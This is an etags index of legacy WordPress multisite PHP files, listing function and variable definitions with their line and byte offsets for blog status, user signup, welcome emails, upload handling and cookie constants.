function update_blog_status( $blog_id, $pref, $value, $deprecated = null ) {update_blog_status629,18448
function update_blog_status( $blog_id, $pref, $value, $deprecated = null ) {deprecated629,18448
		( $value == 1 ) ? do_action( 'make_spam_blog', $blog_id ) :	do_action( 'make_ham_blog', $blog_id );value643,18985
		( $value == 1 ) ? do_action( 'mature_blog', $blog_id ) : do_action( 'unmature_blog', $blog_id );value645,19117
		( $value == 1 ) ? do_action( 'archive_blog', $blog_id ) : do_action( 'unarchive_blog', $blog_id );value647,19248
		( $value == 1 ) ? do_action( 'archive_blog', $blog_id ) : do_action( 'unarchive_blog', $blog_id );value649,19381
function get_blog_status( $id, $pref ) {get_blog_status663,19647
	$details = get_blog_details( $id, false );details666,19704
function get_last_updated( $deprecated = '', $start = 0, $quantity = 40 ) {get_last_updated683,20158
function get_last_updated( $deprecated = '', $start = 0, $quantity = 40 ) {deprecated683,20158
function _update_blog_date_on_post_publish( $new_status, $old_status, $post ) {_update_blog_date_on_post_publish701,20940
	$post_type_obj = get_post_type_object( $post->post_type );post_type_obj702,21020
function _update_blog_date_on_post_delete( $post_id ) {_update_blog_date_on_post_delete721,21453
	$post = get_post( $post_id );post722,21509
	$post_type_obj = get_post_type_object( $post->post_type );post_type_obj724,21541

wordpress/wp-includes/ms-default-constants.php,1965
function ms_upload_constants(  ) {ms_upload_constants15,241
		define( 'UPLOADBLOGSDIR', 'wp-content/blogs.dir' );UPLOADBLOGSDIR21,391
		define( 'UPLOADS', UPLOADBLOGSDIR . "/{$wpdb->blogid}/files/" );UPLOADS26,536
			define( 'BLOGUPLOADDIR', WP_CONTENT_DIR . "/blogs.dir/{$wpdb->blogid}/files/" );BLOGUPLOADDIR28,653
function ms_cookie_constants(  ) {ms_cookie_constants37,809
		define( 'COOKIEPATH', $current_site->path );COOKIEPATH44,928
		define( 'SITECOOKIEPATH', $current_site->path );SITECOOKIEPATH50,1040
			define( 'ADMIN_COOKIE_PATH', SITECOOKIEPATH );ADMIN_COOKIE_PATH57,1195
			define( 'ADMIN_COOKIE_PATH', SITECOOKIEPATH . 'wp-admin' );ADMIN_COOKIE_PATH59,1256
			define('COOKIE_DOMAIN', '.' . $current_site->cookie_domain);COOKIE_DOMAIN68,1464
			define('COOKIE_DOMAIN', '.' . $current_site->domain);COOKIE_DOMAIN70,1535
function ms_file_constants(  ) {ms_file_constants79,1662
		define( 'WPMU_SENDFILE', false );WPMU_SENDFILE85,1801
		define( 'WPMU_ACCEL_REDIRECT', false );WPMU_ACCEL_REDIRECT92,1956
function ms_subdomain_constants() {ms_subdomain_constants105,2322
	static $error = null;error106,2358
	static $error = null;error106,2358
	static $error_warn = false;error_warn107,2381
	static $error_warn = false;error_warn107,2381
		$vhost_deprecated = __( 'The constant <code>VHOST</code> <strong>is deprecated</strong>. Use the boolean constant <code>SUBDOMAIN_INSTALL</code> in wp-config.php to enable a subdomain configuration. Use is_subdomain_install() to check whether a subdomain configuration is enabled.' );vhost_deprecated113,2464
			$error = true;error124,3228
			$error = $error_warn = true;error126,3257
		define( 'VHOST', SUBDOMAIN_INSTALL ? 'yes' : 'no' );VHOST129,3340
		$error = true;error131,3430
		define( 'SUBDOMAIN_INSTALL', 'yes' == VHOST );SUBDOMAIN_INSTALL132,3447
		define( 'SUBDOMAIN_INSTALL', false );SUBDOMAIN_INSTALL134,3506
		define( 'VHOST', 'no' );VHOST135,3546

wordpress/wp-includes/ms-default-filters.php,0

wordpress/wp-includes/ms-deprecated.php,3266
function generate_random_password( $len = 8 ) {generate_random_password22,445
function generate_random_password( $len = 8 ) {len22,445
 * Plugins should use is_multisite() instead of checking if this function existsexists30,651
 * This function must reside in a file included only if is_multisite() due tomust33,776
function is_site_admin( $user_login = '' ) {is_site_admin43,1055
function is_site_admin( $user_login = '' ) {user_login43,1055
		$user_id = get_current_user_id();user_id47,1198
		$user = get_user_by( 'login', $user_login );user51,1280
		$user_id = $user->ID;user_id54,1371
function graceful_fail( $message ) {graceful_fail67,1570
	$message = apply_filters( 'graceful_fail', $message );message69,1665
	$message_template = apply_filters( 'graceful_fail_template',message_template70,1721
function get_user_details( $username ) {get_user_details104,2411
function clear_global_post_cache( $post_id ) {clear_global_post_cache115,2666
function is_main_blog() {is_main_blog125,2883
function validate_email( $email, $check_domain = true) {validate_email136,3091
function validate_email( $email, $check_domain = true) {check_domain136,3091
 * @deprecated No alternative available. For performance reasons this function is not recommended.is144,3292
function get_blog_list( $start = 0, $num = 10, $deprecated = '' ) {get_blog_list146,3395
function get_blog_list( $start = 0, $num = 10, $deprecated = '' ) {start146,3395
	$blogs = $wpdb->get_results( $wpdb->prepare("SELECT blog_id, domain, path FROM $wpdb->blogs WHERE site_id = %d AND public = '1' AND archived = '0' AND mature = '0' AND spam = '0' AND deleted = '0' ORDER BY registered DESC", $wpdb->siteid), ARRAY_A );blogs150,3525
	$blogs = $blog_list;blogs157,4090
	if ( $num == 'all' )num162,4168
 * @deprecated No alternative available. For performance reasons this function is not recommended.is171,4340
function get_most_active_blogs( $num = 10, $display = true ) {get_most_active_blogs173,4443
function get_most_active_blogs( $num = 10, $display = true ) {num173,4443
	$blogs = get_blog_list( 0, 'all', false ); // $blog_id -> $detailsblogs176,4553
		foreach ( (array) $blogs as $key => $details ) {key179,4669
		foreach ( (array) $most_active as $key => $details )key185,4920
		$most_active = $t;most_active189,5037
	if ( $display == true ) {display192,5062
			foreach ( (array) $most_active as $key => $details ) {key195,5151
				$url = esc_url('http://' . $details['domain'] . $details['path']);url196,5209
 * The function looks for redirect arguments in the following order:looks207,5478
function wpmu_admin_do_redirect( $url = '' ) {wpmu_admin_do_redirect222,5825
function wpmu_admin_do_redirect( $url = '' ) {url222,5825
	$ref = '';ref225,5919
		$ref = $_GET['ref'];ref227,5961
		$ref = $_POST['ref'];ref229,6015
		$ref = wpmu_admin_redirect_add_updated_param( $ref );ref232,6055
	$url = wpmu_admin_redirect_add_updated_param( $url );url241,6257
		$url = wpmu_admin_redirect_add_updated_param( $_POST['redirect'] );url246,6519
function wpmu_admin_redirect_add_updated_param( $url = '' ) {wpmu_admin_redirect_add_updated_param262,6794
function wpmu_admin_redirect_add_updated_param( $url = '' ) {url262,6794

wordpress/wp-includes/ms-files.php,1116
define( 'SHORTINIT', true );SHORTINIT11,113
$file = rtrim( BLOGUPLOADDIR, '/' ) . '/' . str_replace( '..', '', $_GET[ 'file' ] );file26,485
$mime = wp_check_filetype( $file );mime32,663
	$mimetype = $mime[ 'type' ];mimetype37,843
	$mimetype = 'image/' . substr( $file, strrpos( $file, '.' ) + 1 );mimetype39,878
$last_modified = gmdate( 'D, d M Y H:i:s', filemtime( $file ) );last_modified54,1373
$etag = '"' . md5( $last_modified ) . '"';etag55,1438
$client_etag = isset( $_SERVER['HTTP_IF_NONE_MATCH'] ) ? stripslashes( $_SERVER['HTTP_IF_NONE_MATCH'] ) : false;client_etag61,1669
$client_last_modified = trim( $_SERVER['HTTP_IF_MODIFIED_SINCE'] );client_last_modified66,1881
$client_modified_timestamp = $client_last_modified ? strtotime( $client_last_modified ) : 0;client_modified_timestamp68,2024
$modified_timestamp = strtotime($last_modified);modified_timestamp71,2174
	? ( ( $client_modified_timestamp >= $modified_timestamp) && ( $client_etag == $etag ) )client_etag74,2271
	: ( ( $client_modified_timestamp >= $modified_timestamp) || ( $client_etag == $etag ) )client_etag75,2360

wordpress/wp-includes/ms-functions.php,27327
function get_sitestats() {get_sitestats19,289
	$stats = array(stats22,332
function get_admin_users_for_domain( $sitedomain = '', $path = '' ) {get_admin_users_for_domain39,646
function get_admin_users_for_domain( $sitedomain = '', $path = '' ) {sitedomain39,646
		$site_id = $wpdb->siteid;site_id43,754
		$site_id = $wpdb->get_var( $wpdb->prepare( "SELECT id FROM $wpdb->site WHERE domain = %s AND path = %s", $sitedomain, $path ) );site_id45,788
 * it is active. If it's inactive, function returns anotherreturns57,1291
function get_active_blog_for_user( $user_id ) {get_active_blog_for_user70,1682
	$blogs = get_blogs_of_user( $user_id );blogs72,1745
	$primary_blog = get_user_meta( $user_id, 'primary_blog', true );primary_blog79,1883
	$first_blog = current($blogs);first_blog80,1949
			$primary = get_blog_details( $first_blog->userblog_id );primary84,2136
			$primary = get_blog_details( $primary_blog );primary86,2207
		$primary = $first_blog;primary92,2520
		$blogs = get_blogs_of_user( $user_id, true ); // if a user's primary blog is shut down, check their other blogs.blogs96,2668
		$ret = false;ret97,2783
			foreach ( (array) $blogs as $blog_id => $blog ) {blog_id99,2852
				$details = get_blog_details( $blog_id );details102,2963
					$ret = $blog;ret104,3119
function get_user_count() {get_user_count130,3681
function get_blog_count( $id = 0 ) {get_blog_count144,3967
function get_blog_count( $id = 0 ) {id144,3967
function get_blog_post( $blog_id, $post_id ) {get_blog_post157,4253
	$key = $blog_id . '-' . $post_id;key160,4316
	$post = wp_cache_get( $key, 'global-posts' );post161,4351
	if ( $post == false ) {post162,4398
		$post = $wpdb->get_row( $wpdb->prepare( 'SELECT * FROM ' . $wpdb->get_blog_prefix( $blog_id ) . 'posts WHERE ID = %d', $post_id ) );post163,4423
function add_user_to_blog( $blog_id, $user_id, $role ) {add_user_to_blog183,4967
	$user = new WP_User($user_id);user186,5052
		$details = get_blog_details($blog_id);details195,5335
function remove_user_from_blog($user_id, $blog_id = '', $reassign = '') {remove_user_from_blog223,6110
function remove_user_from_blog($user_id, $blog_id = '', $reassign = '') {blog_id223,6110
	$user_id = (int) $user_id;user_id226,6226
	$primary_blog = get_user_meta($user_id, 'primary_blog', true);primary_blog231,6421
	if ( $primary_blog == $blog_id ) {primary_blog232,6485
		$new_id = '';new_id233,6521
		$new_domain = '';new_domain234,6537
		$blogs = get_blogs_of_user($user_id);blogs235,6557
			$new_id = $blog->userblog_id;new_id239,6692
			$new_domain = $blog->domain;new_domain240,6725
	$user = new WP_User($user_id);user249,6921
	$blogs = get_blogs_of_user($user_id);blogs257,7118
		$reassign = (int) $reassign;reassign264,7317
function create_empty_blog( $domain, $path, $weblog_title, $site_id = 1 ) {create_empty_blog286,7958
function create_empty_blog( $domain, $path, $weblog_title, $site_id = 1 ) {site_id286,7958
	$domain			= addslashes( $domain );domain287,8034
	$weblog_title	= addslashes( $weblog_title );weblog_title288,8070
		$path = '/';path291,8138
	if ( ! $blog_id = insert_blog($domain, $path, $site_id) )blog_id301,8556
function get_blog_permalink( $_blog_id, $post_id ) {get_blog_permalink320,8999
	$key = "{$_blog_id}-{$post_id}-blog_permalink";key321,9052
	$link = wp_cache_get( $key, 'site-options' );link322,9101
	if ( $link == false ) {link323,9148
		$link = get_permalink( $post_id );link325,9204
function get_blog_id_from_url( $domain, $path = '/' ) {get_blog_id_from_url346,9766
function get_blog_id_from_url( $domain, $path = '/' ) {path346,9766
	$domain = strtolower( $wpdb->escape( $domain ) );domain349,9838
	$path = strtolower( $wpdb->escape( $path ) );path350,9889
	$id = wp_cache_get( md5( $domain . $path ), 'blog-id-cache' );id351,9936
	if ( $id == -1 ) { // blog does not existid353,10001
	$id = $wpdb->get_var( "SELECT blog_id FROM $wpdb->blogs WHERE domain = '$domain' and path = '$path' /* get_blog_id_from_url */" );id359,10099
 * This function checks against the Banned Email Domains listchecks375,10497
function is_email_address_unsafe( $user_email ) {is_email_address_unsafe385,10875
	$banned_names = get_site_option( 'banned_email_domains' );banned_names386,10925
		$banned_names = explode( "\n", $banned_names);banned_names388,11035
		$email_domain = strtolower( substr( $user_email, 1 + strpos( $user_email, '@' ) ) );email_domain391,11156
			if ( $banned_domain == '' )banned_domain393,11299
function wpmu_validate_user_signup($user_name, $user_email) {wpmu_validate_user_signup432,12479
	$errors = new WP_Error();errors435,12557
	$orig_username = $user_name;orig_username437,12585
	$user_name = preg_replace( '/\s+/', '', sanitize_user( $user_name, true ) );user_name438,12615
		$user_name = $orig_username;user_name442,12870
	$user_email = sanitize_email( $user_email );user_email445,12905
	$illegal_names = get_site_option( 'illegal_names' );illegal_names450,13048
		$illegal_names = array(  'www', 'web', 'root', 'admin', 'main', 'invite', 'administrator' );illegal_names452,13148
	$match = array();match468,13938
	$limited_email_domains = get_site_option( 'limited_email_domains' );limited_email_domains476,14225
		$emaildomain = substr( $user_email, 1 + strpos( $user_email, '@' ) );emaildomain478,14384
	$signup = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->signups WHERE user_login = %s", $user_name) );signup492,14988
		$registered_at =  mysql2date('U', $signup->registered);registered_at494,15125
		$now = current_time( 'timestamp', true );now495,15183
		$diff = $now - $registered_at;diff496,15227
	$signup = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->signups WHERE user_email = %s", $user_email) );signup507,15714
		$diff = current_time( 'timestamp', true ) - mysql2date('U', $signup->registered);diff509,15852
	$result = array('user_name' => $user_name, 'orig_username' => $orig_username, 'user_email' => $user_email, 'errors' => $errors);result517,16333
 * This function prevents the current user from registering a new siteprevents528,16702
function wpmu_validate_blog_signup($blogname, $blog_title, $user = '') {wpmu_validate_blog_signup544,17363
function wpmu_validate_blog_signup($blogname, $blog_title, $user = '') {user544,17363
	$blog_title = strip_tags( $blog_title );blog_title547,17483
	$blog_title = substr( $blog_title, 0, 50 );blog_title548,17525
	$errors = new WP_Error();errors550,17571
	$illegal_names = get_site_option( 'illegal_names' );illegal_names551,17598
	if ( $illegal_names == false ) {illegal_names552,17652
		$illegal_names = array( 'www', 'web', 'root', 'admin', 'main', 'invite', 'administrator' );illegal_names553,17686
		$illegal_names = array_merge($illegal_names, apply_filters( 'subdirectory_reserved_names', array( 'page', 'comments', 'blog', 'files', 'feed' ) ) );illegal_names559,17962
	$match = array();match581,19137
	$blogname = apply_filters( 'newblogname', $blogname );blogname586,19310
	$blog_title = stripslashes(  $blog_title );blog_title588,19367
		$mydomain = $blogname . '.' . preg_replace( '|^www\.|', '', $domain );mydomain595,19595
		$path = $base;path596,19668
		$mydomain = "$domain";mydomain598,19695
		$path = $base.$blogname.'/';path599,19720
	$signup = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->signups WHERE domain = %s AND path = %s", $mydomain, $path) ); // TODO: Check email too?signup610,20126
		$diff = current_time( 'timestamp', true ) - mysql2date('U', $signup->registered);diff612,20306
	$result = array('domain' => $mydomain, 'path' => $path, 'blogname' => $blogname, 'blog_title' => $blog_title, 'errors' => $errors);result620,20713
function wpmu_signup_blog($domain, $path, $title, $user, $user_email, $meta = '') {wpmu_signup_blog637,21372
function wpmu_signup_blog($domain, $path, $title, $user, $user_email, $meta = '') {meta637,21372
	$key = substr( md5( time() . rand() . $domain ), 0, 16 );key640,21472
	$meta = serialize($meta);meta641,21531
	$domain = $wpdb->escape($domain);domain642,21558
	$path = $wpdb->escape($path);path643,21593
	$title = $wpdb->escape($title);title644,21624
 * This function is used when user registration is open butis663,22072
function wpmu_signup_user($user, $user_email, $meta = '') {wpmu_signup_user673,22398
function wpmu_signup_user($user, $user_email, $meta = '') {meta673,22398
	$user = preg_replace( '/\s+/', '', sanitize_user( $user, true ) );user677,22490
	$user_email = sanitize_email( $user_email );user_email678,22558
	$key = substr( md5( time() . rand() . $user_email ), 0, 16 );key679,22604
	$meta = serialize($meta);meta680,22667
 * This is the notification function used when site registrationused699,23050
 * Filter 'wpmu_signup_blog_notification' to bypass this function oror702,23133
function wpmu_signup_blog_notification($domain, $path, $title, $user, $user_email, $key, $meta = '') {wpmu_signup_blog_notification720,23863
function wpmu_signup_blog_notification($domain, $path, $title, $user, $user_email, $key, $meta = '') {meta720,23863
		$activate_url = network_site_url("wp-activate.php?key=$key");activate_url728,24215
		$activate_url = "http://{$domain}{$path}wp-activate.php?key=$key"; // @todo use *_url() APIactivate_url730,24285
	$activate_url = esc_url($activate_url);activate_url732,24380
	$admin_email = get_site_option( 'admin_email' );admin_email733,24421
	if ( $admin_email == '' )admin_email734,24471
		$admin_email = 'support@' . $_SERVER['SERVER_NAME'];admin_email735,24498
	$from_name = get_site_option( 'site_name' ) == '' ? 'WordPress' : esc_html( get_site_option( 'site_name' ) );from_name736,24553
	$message_headers = "From: \"{$from_name}\" <{$admin_email}>\n" . "Content-Type: text/plain; charset=\"" . get_option('blog_charset') . "\"\n";message_headers737,24664
	$message = sprintf(message738,24808
	$subject = sprintf(subject748,25266
 * This is the notification function used when no new site hasused763,25620
 * Filter 'wpmu_signup_user_notification' to bypass this function oror766,25705
function wpmu_signup_user_notification($user, $user_email, $key, $meta = '') {wpmu_signup_user_notification781,26271
function wpmu_signup_user_notification($user, $user_email, $key, $meta = '') {meta781,26271
	$admin_email = get_site_option( 'admin_email' );admin_email786,26493
	if ( $admin_email == '' )admin_email787,26543
		$admin_email = 'support@' . $_SERVER['SERVER_NAME'];admin_email788,26570
	$from_name = get_site_option( 'site_name' ) == '' ? 'WordPress' : esc_html( get_site_option( 'site_name' ) );from_name789,26625
	$message_headers = "From: \"{$from_name}\" <{$admin_email}>\n" . "Content-Type: text/plain; charset=\"" . get_option('blog_charset') . "\"\n";message_headers790,26736
	$message = sprintf(message791,26880
	$subject = sprintf(subject799,27236
function wpmu_activate_signup($key) {wpmu_activate_signup831,28145
	$signup = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->signups WHERE activation_key = %s", $key) );signup834,28214
	$meta = maybe_unserialize($signup->meta);meta846,28674
	$user_login = $wpdb->escape($signup->user_login);user_login847,28717
	$user_email = $wpdb->escape($signup->user_email);user_email848,28768
	$password = wp_generate_password( 12, false );password849,28819
	$user_id = username_exists($user_login);user_id851,28868
		$user_id = wpmu_create_user($user_login, $password, $user_email);user_id854,28930
		$user_already_exists = true;user_already_exists856,29004
	$now = current_time('mysql', true);now861,29132
	$blog_id = wpmu_create_blog( $signup->domain, $signup->path, $signup->title, $user_id, $meta, $wpdb->siteid );blog_id876,29724
 * This function runs when a user self-registers as well as whenruns899,30833
function wpmu_create_user( $user_name, $password, $email) {wpmu_create_user912,31345
	$user_name = preg_replace( '/\s+/', '', sanitize_user( $user_name, true ) );user_name913,31405
	$user_id = wp_create_user( $user_name, $password, $email );user_id915,31484
 * This function runs when a user self-registers a new site as wellruns931,31855
function wpmu_create_blog($domain, $path, $title, $user_id, $meta = '', $site_id = 1) {wpmu_create_blog954,32855
function wpmu_create_blog($domain, $path, $title, $user_id, $meta = '', $site_id = 1) {meta954,32855
	$domain = preg_replace( '/\s+/', '', sanitize_user( $domain, true ) );domain955,32943
		$domain = str_replace( '@', '', $domain );domain958,33047
	$title = strip_tags( $title );title960,33093
	$user_id = (int) $user_id;user_id961,33125
		$path = '/';path964,33175
		define( 'WP_INSTALLING', true );WP_INSTALLING971,33421
	if ( ! $blog_id = insert_blog($domain, $path, $site_id) )blog_id973,33457
	if ( is_array($meta) ) foreach ($meta as $key => $value) {key982,33735
		if ( $key == 'public' || $key == 'archived' || $key == 'mature' || $key == 'spam' || $key == 'deleted' || $key == 'lang_id' )key983,33795
function newblog_notify_siteadmin( $blog_id, $deprecated = '' ) {newblog_notify_siteadmin1012,34650
function newblog_notify_siteadmin( $blog_id, $deprecated = '' ) {deprecated1012,34650
	$email = get_site_option( 'admin_email' );email1016,34796
	$options_site_url = esc_url(network_admin_url('settings.php'));options_site_url1020,34891
	$blogname = get_option( 'blogname' );blogname1023,34986
	$siteurl = site_url();siteurl1024,35025
	$msg = sprintf( __( 'New Site: %1smsg1027,35075
	$msg = apply_filters( 'newblog_notify_siteadmin', $msg );msg1032,35239
function newuser_notify_siteadmin( $user_id ) {newuser_notify_siteadmin1050,35741
	$email = get_site_option( 'admin_email' );email1054,35869
	$user = new WP_User($user_id);user1059,35965
	$options_site_url = esc_url(network_admin_url('settings.php'));options_site_url1061,35998
	$msg = sprintf(__('New User: %1smsg1062,36063
	$msg = apply_filters( 'newuser_notify_siteadmin', $msg, $user );msg1067,36214
function domain_exists($domain, $path, $site_id = 1) {domain_exists1085,36739
function domain_exists($domain, $path, $site_id = 1) {site_id1085,36739
 * This function creates a row in the wp_blogs table and returnscreates1093,37017
function insert_blog($domain, $path, $site_id) {insert_blog1103,37413
	$path = trailingslashit($path);path1106,37478
	$site_id = (int) $site_id;site_id1107,37511
	$result = $wpdb->insert( $wpdb->blogs, array('site_id' => $site_id, 'domain' => $domain, 'path' => $path, 'registered' => current_time('mysql')) );result1109,37540
function install_blog($blog_id, $blog_title = '') {install_blog1131,38188
function install_blog($blog_id, $blog_title = '') {blog_title1131,38188
	$blog_id = (int) $blog_id;blog_id1136,38331
	$url = get_blogaddress_by_id($blog_id);url1145,38685
 * This function creates a row in the wp_blogs table.creates1173,39499
function install_blog_defaults($blog_id, $user_id) {install_blog_defaults1183,39738
function wpmu_welcome_notification($blog_id, $user_id, $password, $title, $meta = '') {wpmu_welcome_notification1212,40501
function wpmu_welcome_notification($blog_id, $user_id, $password, $title, $meta = '') {meta1212,40501
	$welcome_email = stripslashes( get_site_option( 'welcome_email' ) );welcome_email1218,40728
	if ( $welcome_email == false )welcome_email1219,40798
		$welcome_email = stripslashes( __( 'Dear User,welcome_email1220,40830
	$url = get_blogaddress_by_id($blog_id);url1234,41168
	$user = new WP_User($user_id);user1235,41209
	$welcome_email = str_replace( 'SITE_NAME', $current_site->site_name, $welcome_email );welcome_email1237,41242
	$welcome_email = str_replace( 'BLOG_TITLE', $title, $welcome_email );welcome_email1238,41330
	$welcome_email = str_replace( 'BLOG_URL', $url, $welcome_email );welcome_email1239,41401
	$welcome_email = str_replace( 'USERNAME', $user->user_login, $welcome_email );welcome_email1240,41468
	$welcome_email = str_replace( 'PASSWORD', $password, $welcome_email );welcome_email1241,41548
	$welcome_email = apply_filters( 'update_welcome_email', $welcome_email, $blog_id, $user_id, $password, $title, $meta);welcome_email1243,41621
	$admin_email = get_site_option( 'admin_email' );admin_email1244,41741
	if ( $admin_email == '' )admin_email1246,41792
		$admin_email = 'support@' . $_SERVER['SERVER_NAME'];admin_email1247,41819
	$from_name = get_site_option( 'site_name' ) == '' ? 'WordPress' : esc_html( get_site_option( 'site_name' ) );from_name1249,41875
	$message_headers = "From: \"{$from_name}\" <{$admin_email}>\n" . "Content-Type: text/plain; charset=\"" . get_option('blog_charset') . "\"\n";message_headers1250,41986
	$message = $welcome_email;message1251,42130
	$subject = apply_filters( 'update_welcome_subject', sprintf(__('New %1$s Site: %2$s'), $current_site->site_name, stripslashes( $title ) ) );subject1256,42244
function wpmu_welcome_user_notification($user_id, $password, $meta = '') {wpmu_welcome_user_notification1276,42955
function wpmu_welcome_user_notification($user_id, $password, $meta = '') {meta1276,42955
	$welcome_email = get_site_option( 'welcome_user_email' );welcome_email1282,43156
	$user = new WP_User($user_id);user1284,43216
	$welcome_email = apply_filters( 'update_welcome_user_email', $welcome_email, $user_id, $password, $meta);welcome_email1286,43249
	$welcome_email = str_replace( 'SITE_NAME', $current_site->site_name, $welcome_email );welcome_email1287,43356
	$welcome_email = str_replace( 'USERNAME', $user->user_login, $welcome_email );welcome_email1288,43444
	$welcome_email = str_replace( 'PASSWORD', $password, $welcome_email );welcome_email1289,43524
	$welcome_email = str_replace( 'LOGINLINK', wp_login_url(), $welcome_email );welcome_email1290,43596
	$admin_email = get_site_option( 'admin_email' );admin_email1292,43675
	if ( $admin_email == '' )admin_email1294,43726
		$admin_email = 'support@' . $_SERVER['SERVER_NAME'];admin_email1295,43753
	$from_name = get_site_option( 'site_name' ) == '' ? 'WordPress' : esc_html( get_site_option( 'site_name' ) );from_name1297,43809
	$message_headers = "From: \"{$from_name}\" <{$admin_email}>\n" . "Content-Type: text/plain; charset=\"" . get_option('blog_charset') . "\"\n";message_headers1298,43920
	$message = $welcome_email;message1299,44064
	$subject = apply_filters( 'update_welcome_user_subject', sprintf(__('New %1$s User: %2$s'), $current_site->site_name, $user->user_login) );subject1304,44178
function get_current_site() {get_current_site1319,44578
function get_user_id_from_string( $string ) {get_user_id_from_string1333,44810
	$user_id = 0;user_id1334,44856
		$user = get_user_by('email', $string);user1336,44901
			$user_id = $user->ID;user_id1338,44957
		$user_id = $string;user_id1340,45020
		$user = get_user_by('login', $string);user1342,45052
			$user_id = $user->ID;user_id1344,45108
function get_most_recent_post_of_user( $user_id ) {get_most_recent_post_of_user1362,45449
	$user_blogs = get_blogs_of_user( (int) $user_id );user_blogs1365,45517
	$most_recent_post = array();most_recent_post1366,45569
		$prefix = $wpdb->get_blog_prefix( $blog->userblog_id );prefix1371,45726
		$recent_post = $wpdb->get_row( $wpdb->prepare("SELECT ID, post_date_gmt FROM {$prefix}posts WHERE post_author = %d AND post_type = 'post' AND post_status = 'publish' ORDER BY post_date_gmt DESC LIMIT 1", $user_id ), ARRAY_A);recent_post1372,45784
			$post_gmt_ts = strtotime($recent_post['post_date_gmt']);post_gmt_ts1376,46081
				$most_recent_post = array(most_recent_post1382,46391
 * A helper function that is used primarily to check whetherthat1400,46698
function get_dirsize( $directory ) {get_dirsize1409,46901
	$dirsize = get_transient( 'dirsize_cache' );dirsize1410,46938
		$dirsize = array();dirsize1415,47140
function recurse_dirsize( $directory ) {recurse_dirsize1434,47534
	$size = 0;size1435,47575
	$directory = untrailingslashit( $directory );directory1437,47588
			$path = $directory.'/'.$file;path1444,47827
					$handlesize = recurse_dirsize($path);handlesize1449,47988
function upload_is_user_over_quota( $echo = true ) {upload_is_user_over_quota1469,48387
function upload_is_user_over_quota( $echo = true ) {echo1469,48387
	$spaceAllowed = get_space_allowed();spaceAllowed1473,48514
		$spaceAllowed = 10;	// Default space allowed is 10 MBspaceAllowed1475,48615
	$size = get_dirsize( BLOGUPLOADDIR ) / 1024 / 1024;size1477,48672
 * get_allowed_mime_types(). This function is used to filteris1493,49115
function check_upload_mimes( $mimes ) {check_upload_mimes1502,49355
	$site_exts = explode( ' ', get_site_option( 'upload_filetypes' ) );site_exts1503,49395
		foreach ( $mimes as $ext_pattern => $mime ) {ext_pattern1505,49498
 * with get_blog_details(). This function is called when postsis1518,49843
function update_posts_count( $deprecated = '' ) {update_posts_count1523,49981
function update_posts_count( $deprecated = '' ) {deprecated1523,49981
function wpmu_log_new_registrations( $blog_id, $user_id ) {wpmu_log_new_registrations1536,50299
	$user = new WP_User( (int) $user_id );user1538,50374
function fix_import_form_size( $size ) {fix_import_form_size1553,50831
	$spaceAllowed = 1024 * 1024 * get_space_allowed();spaceAllowed1557,50936
	$dirsize = get_dirsize( BLOGUPLOADDIR );dirsize1558,50988
function global_terms( $term_id, $deprecated = '' ) {global_terms1575,51456
function global_terms( $term_id, $deprecated = '' ) {deprecated1575,51456
	static $global_terms_recurse = null;global_terms_recurse1577,51525
	static $global_terms_recurse = null;global_terms_recurse1577,51525
	$recurse_start = false;recurse_start1583,51645
	if ( $global_terms_recurse === null ) {global_terms_recurse1584,51670
		$recurse_start = true;recurse_start1585,51711
		$global_terms_recurse = 1;global_terms_recurse1586,51736
	$term_id = intval( $term_id );term_id1591,51833
	$c = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $wpdb->terms WHERE term_id = %d", $term_id ) );c1592,51865
	$global_id = $wpdb->get_var( $wpdb->prepare( "SELECT cat_ID FROM $wpdb->sitecategories WHERE category_nicename = %s", $c->slug ) );global_id1594,51967
	if ( $global_id == null ) {global_id1595,52100
		$used_global_id = $wpdb->get_var( $wpdb->prepare( "SELECT cat_ID FROM $wpdb->sitecategories WHERE cat_ID = %d", $c->term_id ) );used_global_id1596,52129
			$global_id = $wpdb->insert_id;global_id1599,52426
			$max_global_id = $wpdb->get_var( "SELECT MAX(cat_ID) FROM $wpdb->sitecategories" );max_global_id1603,52522
			$max_local_id = $wpdb->get_var( "SELECT MAX(term_id) FROM $wpdb->terms" );max_local_id1604,52609
			$new_global_id = max( $max_global_id, $max_local_id ) + mt_rand( 100, 400 );new_global_id1605,52687
			$global_id = $wpdb->insert_id;global_id1607,52904
		$local_id = $wpdb->get_row( $wpdb->prepare( "SELECT term_id FROM $wpdb->terms WHERE term_id = %d", $global_id ) );local_id1610,52981
			$local_id = global_terms( $local_id );local_id1612,53125
				$global_id = $term_id;global_id1614,53204
		$global_terms_recurse = null;global_terms_recurse1628,53730
function redirect_this_site( $deprecated = '' ) {redirect_this_site1641,53973
function redirect_this_site( $deprecated = '' ) {deprecated1641,53973
function upload_is_file_too_big( $upload ) {upload_is_file_too_big1654,54292
function signup_nonce_fields() {signup_nonce_fields1670,54769
	$id = mt_rand();id1671,54802
function signup_nonce_check( $result ) {signup_nonce_check1685,55111
function maybe_redirect_404() {maybe_redirect_4041700,55464
	if ( is_main_site() && is_404() && defined( 'NOBLOGREDIRECT' ) && ( $destination = apply_filters( 'blog_redirect_404', NOBLOGREDIRECT ) ) ) {destination1702,55519
		if ( $destination == '%siteurl%' )destination1703,55662
			$destination = network_home_url();destination1704,55699
function maybe_add_existing_user_to_blog() {maybe_add_existing_user_to_blog1720,56131
	$parts = explode( '/', $_SERVER[ 'REQUEST_URI' ] );parts1724,56264
	$key = array_pop( $parts );key1725,56317
	if ( $key == '' )key1727,56347
		$key = array_pop( $parts );key1728,56366
	$details = get_option( 'new_user_' . $key );details1730,56397
function add_existing_user_to_blog( $details = false ) {add_existing_user_to_blog1748,57086
function add_existing_user_to_blog( $details = false ) {details1748,57086
		$result = add_user_to_blog( $blog_id, $details[ 'user_id' ], $details[ 'role' ] );result1752,57193
function add_new_user_to_blog( $user_id, $email, $meta ) {add_new_user_to_blog1767,57519
		$blog_id = $meta[ 'add_to_blog' ];blog_id1770,57644
		$role = $meta[ 'new_role' ];role1771,57681
function fix_phpmailer_messageid( $phpmailer ) {fix_phpmailer_messageid1783,58002
function is_user_spammy( $username = 0 ) {is_user_spammy1798,58333
function is_user_spammy( $username = 0 ) {username1798,58333
	if ( $username == 0 ) {username1799,58376
		$user_id = get_current_user_id();user_id1800,58401
		$user_id = get_user_id_from_string( $username );user_id1802,58447
